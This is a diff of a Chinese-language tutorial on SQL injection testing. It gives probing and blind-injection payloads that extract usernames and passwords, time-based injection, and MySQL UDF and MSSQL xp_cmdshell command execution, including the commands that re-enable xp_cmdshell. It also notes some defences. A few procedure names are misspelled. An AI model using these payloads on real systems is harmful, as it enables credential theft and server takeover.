@@ -1,14 +1,19 @@
-# SQL Injection 测试用例
-> 文中大量引用了网络上的知名文章，若有侵权，请联系删除。
+# SQL Injection 测试思路与用例
 
-## 判断注入点
+## 基本思路
+
+### 寻找注入点
 
 可以关注一下地方：
 - 搜索框
 - 注册框
 - 登录框
+- 排序
+- 动态图表
+- 日期查询
+- 语种选择
 
-### 搜索框
+#### 搜索框
 
 搜索框可能用到语句有：
 
@@ -19,30 +24,30 @@
 > 预编译SQL语句就是将这类语句中的值用“占位符”替代，可以视为将sql语句模板化或者说参数化。一次编译、多次运行，省去了解析优化等过程。DBMS可以将一些常用的预编译语句缓存起来，更好的优化查询。预编译通过 PreparedStatement 和 占位符 实现。使用预编译，SQL注入的参数将不会再进行SQL编译，即 or, and 等关键字不被认为是 SQL语法。上例中“{ }”,就是参数传入位置。
 
 
-### 排序功能（get或post排序参数）注入点
+#### 排序功能（get或post排序参数）注入点
 
 排序可能使用了sql的```order by``` 或是 ```sort```,这也是一个常见的可注入点。而且 order by 后语句不能参数化，有利于注入。
 
 
-### 日期型参数注入点
+#### 日期型参数注入点
 
 例如有下列语句：
 ```SELECT * FROM `wp_posts` where post_content like '%%' and post_date BETWEEN '2020/01/01' and '2020/09/02'```
 
 日期类型如果在接受参数的时候没有进行强制类型转换很容易出现注入问题，也是直接拼接的原因。
 
-### 语种选择
+#### 语种选择
 
 即出现```lang=cn``` 或 ```language=en```的地方。
 
-### 其他常见输入处或隐藏输入处
+#### 其他常见输入处或隐藏输入处
 
 - login
 - register
 - forgot password
 - remember me
 
-## 初步尝试
+### 尝试是否可注入
 
 使用下列进行初步尝试，页面不报错或有不同反馈都可能预示着注入的可能。
 - ```1 or 1=1```
@@ -50,8 +55,28 @@
 - ```1" or "1"="1```
 - ```" or 1=1 or  version() "``` 
 - ```" and ord(mid(version(),1,1))>51)"``` 返回正常（没变化）说明是4.0以上版本，可以用union查询。
+- `1 and substring(@@version,1,1)=5` 返回正常，说明是5.x版本。结果居然报“Sorry the solution is not correct, please try again.” 这应该是语句含有不支持的函数VERSION()，那么后台可能不是mysql。
 
-## 尝试特殊字符
+### 判断数据库类型
+猜测是否有可用的函数，如：
+- database()
+- database_name()
+
+例如：猜一下，是不是还有个函数叫database_name(),测试 ```tom' and  SUBSTRING(database_name(),1,1)='a'     ;--``` 查看页面结果或响应状态。
+
+构造一个fuzz：```tom'\+and\+SUBSTRING\(database_name\(\),[0-9],1\)='\w'\+;--```，查看哪些响应中含有“...already exists please try to register with a different username.”，发现数据库名为“HSQLDB” ,是Java内置的数据库。
+
+### 猜测用户名
+
+- 判断第一个用户名的首字符是否为字母（ascii('A')=65）？ 
+  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) >64`
+- 判断第一个用户名的首字符是否为小写字母（ascii('a')=97）？ 
+  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) >96`
+- 判断第一个用户名的首字符是否为a-m的小写字母（ascii('n')=110）？ 
+  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) < 110` 
+- ...
+
+### 尝试特殊字符是否可用
 
 
 - ```/* */```，行内注释
@@ -63,15 +88,28 @@
 - ```||```, 用于连接字符串
 - ```Char()```， 转化为字符串函数
 
+### 尝试不同编码
 
-## 特殊语句
+历史上，曾经出现过基于字符集的注入技巧。
 
-### union
+开发人员常会转义单引号、双引号等特殊字符。但如果数据库采用了宽字符集，可能会有一些字符解析漏洞存在。这是因为web中没有考虑双字节字符的问题，双字节字符可能被web认为是两个字节。
+
+例如：php中的addslashes()函数会转义单引号、双引号、NULL和`\`，或当maigc_quotes_gpc开启时，会在特殊符号前加转义字符“\”
+
+例如：mysql使用GBK编码时，`0xbf27` 和 `0xbf5c`被认为是相同的字符
+
+#### 防护方法
+- 在软件系统各层面统一编码，建议使用utf-8
+- html `<meta charset='utf-8'>`，确定设置当前页面字符集。
+
+### 尝试特殊语句
+
+#### union
 union语句用来将两个或多个select语句的结果结合起来。即对结果做并操作。
 
 注意，使用union时：
 - 各个查询语句的结果中，列的数量必须相同；
-- 第一个select语句的第一列的数据类型，必须匹配后续所有查询语句的第一列的数据类型；
+- 后续union查询语句各列的数据类型，必须与第一个select语句的各列数据类型相一致。
 - 上述要求对所有列有效。
 
 ```select first_name from user_system_data union select login_count from user_data;```
@@ -79,14 +117,14 @@ union语句用来将两个或多个select语句的结果结合起来。即对结
 union所有的语法也允许重复值。
 
 
-### joins
+#### joins
 
 join运算用于基于一个关联的列，来连接（组合）两个或多个表。
 
 ```select * from user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;```
 
 
-## 盲注
+### 尝试盲注
 
 盲注就是通过询问数据库真或假问题，基于应用响应判断答案是真是假的方法。这种方法常用于那些使用通用错误提示的web系统是否有sql注入漏洞，并对有问题的加以利用。
 
@@ -103,8 +141,6 @@ join运算用于基于一个关联的列，来连接（组合）两个或多个�
 - 猜测数据库版本：```https://my-shop.com?article=4 AND substring(database_version(),1,1) = 2``` 
 
 
-
-
 ### 基于时间的注入
 
 与上面不同的是，服务器对于提交的测试sql不会有明确的有区别的响应，那么我们可以根据不同语句的执行响应时间来进行判断。
@@ -114,36 +150,109 @@ join运算用于基于一个关联的列，来连接（组合）两个或多个�
 例如：```https://my-shop.com?article=4 ; sleep(4)```
 
 
-### 盲注常用函数
+## 自定义函数 UDF
 
-#### GROUP_CONCAT(列名) 
+不少数据库都支持从本地文件系统中导入一个共享文件作为自定义函数。自定义函数可能调用系统命令，完成系统渗透。
 
-连接所有结果为一个字符串。
+例如：mysql 4.x 的UDF的语法如下：
 
-例如：```SELECT group_concat(TABLE_NAME) FROM information_schema.tables```
+`CREATE FUNCTION foo_name RETURNS INTEGER SONAME shared_library`
 
-#### SUBSTRING(字符串,起始位置i,长度l)
+在 mysql 5.x后，上述定义不再适用。但可通过 lib_mysqludf_sys 提供的几个函数执行系统命令，最主要的是：
+- `sys_eval()` 执行任意系统命令，返回输出
+- `sys_exec()` 执行任意命令，将退出码返回
+- `sys_get()` 获取一个环境变量
+- `sys_set()` 设置一个环境变量
 
-返回字符串从第i(i=1,..,n)个起始位置，长度为l的字串。
+将 lib_mysqludf_sys 上传到数据库能访问的路径下，创建UDF后就可以使用上述命令了。
 
-```tom' and substring((SELECT group_concat(COLUMN_NAME) FROM information_schema.columns where TABLE_NAME='EMPLOYEE' ),1,1)='a' ; --```
+sqlmap已经集成了这一功能，例如sqlmap执行linux命令`id`：
+`python sqlmap.py -u "http://target-ip/injectable_path?id=1" --os-cmd id -v 1`
 
-上面的语句中的第一个1和‘a'处，可以使用FUZZ payload设置，实现盲注测试。
+UDF不仅是MYSQL的特性，其他数据库也有类似功能：
+- ms sql server，可以直接使用存储过程`xp_cmdshell`执行系统命令
+- oracle 中，如果服务器有java环境，那么也可能造成命令执行，即注入后可多语句执行的情况下，可以在oracle中创建java的存储过程，执行系统命令。
 
-#### LENGTH(字符串)
-返回字符串长度。
-
-```SELECT LENGTH(group_concat(TABLE_NAME)) FROM information_schema.tables```
-
-#### database_version() , VERSION()等
-
-#### database_name() 等
+## 曾经出现过的 sql column truncation
+基本思路是插入过长的数值时，可能会被截断，例如插入users表用户名`admin    很长的空格     x`，一些数据库产品会截断这个输入，并且插入执行成功。这样数据库中可能就存在2个admin了。
 
 
-### 常用系统表
-#### information_schema.tables 
+## 攻击存储过程
+仅当存储过程不能生成动态sql时，才可以使用存储过程避免注入问题。
 
-#### information_schema.columns 
+
+### 存储过程
+在ms sql server 和oracle中有大量内置的存储过程，他们与UDF很像，但必须使用 `CALL` 或 `EXECUTE` 执行。
+
+#### ms sql server
+
+#####  xp_cmdshell
+微软的sql server 中，存储过程 `xp_cmdshell`可谓是臭名昭著，黑客教程总会讲到注入sql server时使用其执行系统命令：
+- `EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:\'`
+- `EXEC master.dbo.xp_cmdshell 'ping'`
+
+存储过程 `xp_cmdshell` 在sqlserver 2000默认开启，在 2005后被默认关闭了。但sqlserver2005\2008中, 如果当前数据库用户有 sysadmin 权限，则可以使用 `sp_configure` 重新开启它。如果在sqlserver 2000被关闭，则可以使用sp_addextendproc开启它。
+
+例如：
+```
+EXEC sp_configure 'show advanced options' , 1
+RECONFIGURE
+
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+```
+
+##### 其他可用的存储过程
+- `xp_regread` 操作注册表
+- xp_regaddmultistring
+- xp_regdeletekey
+- xp_regdeletekey
+- xp_regenumkeys
+- xp_regenumvalues
+- xp_regread
+- xp_regremovemultistring
+- xp_regwrite
+- xp_servicecontrol ,允许用户启动，停止服务
+- xp_availablemedia，显示机器上有用的驱动器
+- xp_dirtree，允许获得一个目录树
+- xp_enumdsn，列举服务器上的odbc数据源
+- xp_loginconfig，获取服务器安全信息
+- xp_makecab，允许用户在服务器上创建一个压缩文件
+- xp_ntsec_enumdomains，列举服务器可以进入的域
+- xp_terminate_process，提供进程id，终止此进程
+
+例如:
+```
+EXEC xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters','nullsessionshares'
+
+EXEC xp_regnumvalues HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'
+
+EXEC master..xp_serviccontrol 'start' , 'schedule'
+```
+##### 存储过程本身的注入漏洞
+
+可注入的存储过程举例(Microsoft SQL Server):
+```sql
+CREATE PROEDURE getUser(@lastName nvarchar(25))
+AS
+declare @sql nvarchar(255)
+set @sql = 'select * from users where
+            LastName = + @LastName + '
+exec sp_executesql @sql
+```
+上面的@sql是一个动态的sql语句，可以被替换为注入内容。
+
+安全的存储过程例如(Microsoft SQL Server)：
+```sql
+CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
+AS
+SELECT City, COUNT(*)
+FROM Customers
+WHERE Country LIKE @Country GROUP BY City
+
+EXEC ListCustomers ‘USA’
+```
+
 
 
 ## 绕过WAF
